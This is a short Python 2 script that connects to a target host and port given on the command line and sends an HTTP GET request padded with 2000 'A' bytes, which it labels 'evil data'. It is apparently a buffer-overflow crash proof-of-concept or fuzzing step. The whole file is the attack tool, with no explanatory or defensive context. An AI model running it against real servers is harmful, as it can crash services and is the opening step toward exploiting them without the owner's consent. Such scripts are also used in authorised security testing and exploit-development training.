#!/usr/bin/python 

import errno 
import os 
from os import strerror 
from socket import * 
import sys 
from time  import sleep 
from struct import pack

ip = sys.argv[1] 
port = int(sys.argv[2])

buf =  "\x41"*2000

print buf

print "[+] Connecting to server."

try:     
    s = socket(AF_INET,SOCK_STREAM)
    s.connect((ip,port))
    print "[+] Connected..." 
    sleep(1) 
    print "[+] Send evil data..." 
    s.send("GET "+buf+" HTTP 1/1 \r\n\r\n") 
    sleep(2) 
    s.close() 
    print "[+] Evil data sent" 
except: 
    print "[*]Error"
